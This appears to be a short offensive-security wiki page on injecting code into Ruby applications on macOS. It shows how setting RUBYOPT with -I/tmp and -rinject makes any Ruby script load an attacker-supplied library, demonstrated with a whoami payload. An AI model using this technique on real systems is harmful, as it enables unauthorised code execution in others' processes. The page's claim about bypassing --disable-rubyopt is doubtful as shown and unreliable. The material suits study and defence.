# macOS Ruby Applications Injection


## RUBYOPT

Using this env variable it's possible to **add new params** to **ruby** whenever it gets executed. Although the param **`-e`** cannot be used to specify ruby code to execute, it's possible to use the params **`-I`** and **`-r`** to add a new folder to the libraries to load path and then **specify a library to load**.

Create the library **`inject.rb`** in **`/tmp`**:

{% code title="inject.rb" %}
```ruby
puts `whoami`
```
{% endcode %}

Create anywahere a ruby script like:

{% code title="hello.rb" %}
```ruby
puts 'Hello, World!'
```
{% endcode %}

Then make an arbitrary ruby script load it with:

```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb
```

Fun fact, it works even with param **`--disable-rubyopt`**:

```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb --disable-rubyopt
```

